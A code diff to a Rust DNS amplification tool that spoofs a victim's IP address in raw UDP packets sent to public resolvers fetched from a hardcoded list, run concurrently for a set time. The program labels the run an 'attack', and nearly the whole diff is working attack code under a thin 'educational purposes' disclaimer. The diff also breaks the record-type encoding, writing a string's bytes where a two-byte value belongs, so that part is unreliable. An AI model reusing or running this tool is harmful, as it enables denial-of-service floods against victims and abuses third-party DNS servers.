@@ -5,19 +5,16 @@
 // Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
 
 use clap::{arg, command, Parser};
-use dotenv::dotenv;
 use pnet::packet::ipv4::MutableIpv4Packet;
 use pnet::packet::udp::MutableUdpPacket;
 use pnet::packet::Packet;
 use reqwest;
-use std::env;
 use std::fs::File;
 use std::io::{self, BufRead, BufReader, Error, ErrorKind};
 use std::net::Ipv4Addr;
 use std::str::FromStr;
 use std::time::Duration;
 use tokio::{self};
-use trust_dns_proto::rr::RecordType;
 
 use libc::{sendto, sockaddr, sockaddr_in, AF_INET, IPPROTO_RAW, SOCK_RAW};
 use std::mem;
@@ -67,25 +64,29 @@ async fn send_dns_query(
     domain: &str,
     source_ip: Ipv4Addr,
     source_port: u16,
-    record_type: RecordType,
+    record_type: &str,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let dns_query_payload = build_dns_query(domain, record_type);
     let udp_payload = build_udp_packet(source_port, 53, source_ip, dst_ip, &dns_query_payload);
     let ip_payload = build_ip_packet(source_ip, dst_ip, &udp_payload);
 
     match send_raw_packet(dst_ip, &ip_payload) {
-        Ok(_) => {
-            let dns_server = colorize(&dst_ip.to_string(), "red");
-            let source_ip = colorize(&source_ip.to_string(), "green");
-            println!("Query send to {} from {}", dns_server, source_ip);
-        }
+        Ok(_) => 
+            println!(
+                "{} {} {} {} {}",
+                colorize("Sent", "green"),
+                colorize("DNS", "yellow"),
+                colorize("query", "yellow"),
+                colorize("to", "green"),
+                colorize(&dst_ip.to_string(), "blue")
+            ),
         Err(err) => println!("Error sending packet: {:?}", err),
     }
 
     Ok(())
 }
 
-fn build_dns_query(domain: &str, record_type: RecordType) -> Vec<u8> {
+fn build_dns_query(domain: &str, record_type: &str) -> Vec<u8> {
     let mut header = [0u8; 12];
 
     // Transaction ID (random)
@@ -106,8 +107,7 @@ fn build_dns_query(domain: &str, record_type: RecordType) -> Vec<u8> {
         question.push(0); // End of domain name
     }
 
-    let record_type_u16: u16 = record_type.into();
-    question.extend(&record_type_u16.to_be_bytes()); // Record type (big-endian)
+    question.extend(&*record_type.as_bytes()); // Record type (big-endian)
     question.extend(&0x0001u16.to_be_bytes()); // Record class (big-endian)
 
     // Combine header and question to form the complete DNS query
@@ -126,7 +126,7 @@ fn build_udp_packet(
     payload: &[u8],
 ) -> Vec<u8> {
     let mut udp_packet = MutableUdpPacket::owned(vec![0u8; 8 + payload.len()]).unwrap();
-    
+
     udp_packet.set_source(src_port);
     udp_packet.set_destination(dst_port);
     udp_packet.set_payload(payload);
@@ -210,7 +210,7 @@ async fn amplify(
     domain: &str,
     source_ip: &str,
     source_port: u16,
-    record_type: RecordType,
+    record_type: &str,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let source_ip = match Ipv4Addr::from_str(source_ip) {
         Ok(ip) => ip,
@@ -271,9 +271,14 @@ struct Args {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    if unsafe { libc::geteuid() } != 0 {
+        eprintln!("This program must be run as root!");
+        std::process::exit(1);
+    }
+
     let args = Args::parse();
 
-    let record_type = RecordType::from_str(args.record_type.as_ref().unwrap()).unwrap();
+    let record_type = args.record_type.unwrap();
     let source_ip = args.target.as_str();
     let source_port = args.port;
     let time = args.time;
@@ -282,9 +287,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let dns_servers: Vec<String>;
 
     if args.server_list.is_none() && args.dns_resolver.is_none() {
-        dotenv().ok();
-        let dns_server_list_url = env::var("DNS_SERVER_LIST_URL").unwrap();
-        dns_servers = get_public_dns_servers(&dns_server_list_url).await?;
+        dns_servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
     } else if args.dns_resolver.is_some() {
         dns_servers = args.dns_resolver.map(|s| vec![s]).unwrap_or(vec![]);
     } else {
@@ -303,9 +306,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let dns_servers = dns_servers.clone();
         let source_ip = source_ip.to_string();
         let domain = domain.clone();
+        let record_type = record_type.clone();
 
         let handle = tokio::spawn(async move {
-            amplify(&dns_servers, &domain, &source_ip, source_port, record_type).await
+            amplify(&dns_servers, &domain, &source_ip, source_port, &record_type).await
         });
 
         handles.push(handle);
@@ -317,7 +321,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             handle.abort();
         }
         println!(
-            "Attack on {} for {} seconds finished...",
+            "\nAttack on {} for {} seconds finished...",
             colorize(source_ip, "green"),
             colorize(&time.to_string(), "red")
         );
